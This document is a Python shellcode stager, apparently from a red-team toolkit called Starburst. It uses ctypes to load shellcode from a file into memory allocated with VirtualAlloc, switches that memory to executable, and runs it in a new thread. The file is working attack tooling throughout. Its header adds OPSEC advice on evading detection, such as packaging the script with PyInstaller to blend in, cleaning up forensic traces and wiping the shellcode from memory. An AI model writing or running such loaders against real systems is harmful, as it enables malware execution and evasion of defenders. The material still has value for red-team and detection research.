"""
============================================================================
Starburst Python Stager - ctypes VirtualAlloc Local Execution
============================================================================
Technique:  Read shellcode from file, VirtualAlloc RW, copy, flip RX,
            CreateThread, WaitForSingleObject
Usage:      python stager_ctypes.py <shellcode.bin>
OPSEC Notes:
    - Python processes are uncommon in many environments and may stand out.
    - ctypes calls to kernel32 are visible to API monitoring/hooking.
    - The VirtualAlloc + CreateThread sequence is a known shellcode pattern.
    - Python bytecode (.pyc) may be cached and leave forensic artifacts.
    - Consider compiling to .exe with PyInstaller for better blending.
    - The shellcode file is read from disk — ensure it is cleaned up.
    - Memory allocation size matching shellcode size is an indicator.
============================================================================
"""

import sys
import ctypes
import ctypes.wintypes as wintypes

# Constants
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
INFINITE = 0xFFFFFFFF

# kernel32 function prototypes
kernel32 = ctypes.windll.kernel32

# VirtualAlloc
kernel32.VirtualAlloc.argtypes = [
    wintypes.LPVOID,   # lpAddress
    ctypes.c_size_t,   # dwSize
    wintypes.DWORD,    # flAllocationType
    wintypes.DWORD,    # flProtect
]
kernel32.VirtualAlloc.restype = wintypes.LPVOID

# VirtualProtect
kernel32.VirtualProtect.argtypes = [
    wintypes.LPVOID,           # lpAddress
    ctypes.c_size_t,           # dwSize
    wintypes.DWORD,            # flNewProtect
    ctypes.POINTER(wintypes.DWORD),  # lpflOldProtect
]
kernel32.VirtualProtect.restype = wintypes.BOOL

# RtlMoveMemory
kernel32.RtlMoveMemory.argtypes = [
    wintypes.LPVOID,   # Destination
    wintypes.LPCVOID,  # Source
    ctypes.c_size_t,   # Length
]
kernel32.RtlMoveMemory.restype = None

# CreateThread
kernel32.CreateThread.argtypes = [
    wintypes.LPVOID,           # lpThreadAttributes
    ctypes.c_size_t,           # dwStackSize
    wintypes.LPVOID,           # lpStartAddress
    wintypes.LPVOID,           # lpParameter
    wintypes.DWORD,            # dwCreationFlags
    ctypes.POINTER(wintypes.DWORD),  # lpThreadId
]
kernel32.CreateThread.restype = wintypes.HANDLE

# WaitForSingleObject
kernel32.WaitForSingleObject.argtypes = [
    wintypes.HANDLE,   # hHandle
    wintypes.DWORD,    # dwMilliseconds
]
kernel32.WaitForSingleObject.restype = wintypes.DWORD

# CloseHandle
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <shellcode.bin>")
        sys.exit(1)

    shellcode_path = sys.argv[1]

    # Read shellcode from file
    try:
        with open(shellcode_path, "rb") as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"Error: File not found: {shellcode_path}")
        sys.exit(1)
    except IOError as e:
        print(f"Error reading file: {e}")
        sys.exit(1)

    if not shellcode:
        print("Error: Shellcode file is empty")
        sys.exit(1)

    sc_length = len(shellcode)

    # Allocate RW memory
    address = kernel32.VirtualAlloc(
        None,
        sc_length,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )

    if not address:
        print(f"Error: VirtualAlloc failed (error {ctypes.GetLastError()})")
        sys.exit(1)

    # Copy shellcode to allocated memory
    shellcode_buffer = ctypes.create_string_buffer(shellcode)
    kernel32.RtlMoveMemory(
        address,
        shellcode_buffer,
        sc_length,
    )

    # Clear shellcode from Python memory
    ctypes.memset(ctypes.addressof(shellcode_buffer), 0, sc_length)
    del shellcode

    # Flip memory protection from RW to RX
    old_protect = wintypes.DWORD(0)
    result = kernel32.VirtualProtect(
        address,
        sc_length,
        PAGE_EXECUTE_READ,
        ctypes.byref(old_protect),
    )

    if not result:
        print(f"Error: VirtualProtect failed (error {ctypes.GetLastError()})")
        sys.exit(1)

    # Create thread at shellcode address
    thread_id = wintypes.DWORD(0)
    thread_handle = kernel32.CreateThread(
        None,
        0,
        address,
        None,
        0,
        ctypes.byref(thread_id),
    )

    if not thread_handle:
        print(f"Error: CreateThread failed (error {ctypes.GetLastError()})")
        sys.exit(1)

    # Wait for thread to finish
    kernel32.WaitForSingleObject(thread_handle, INFINITE)
    kernel32.CloseHandle(thread_handle)


if __name__ == "__main__":
    main()
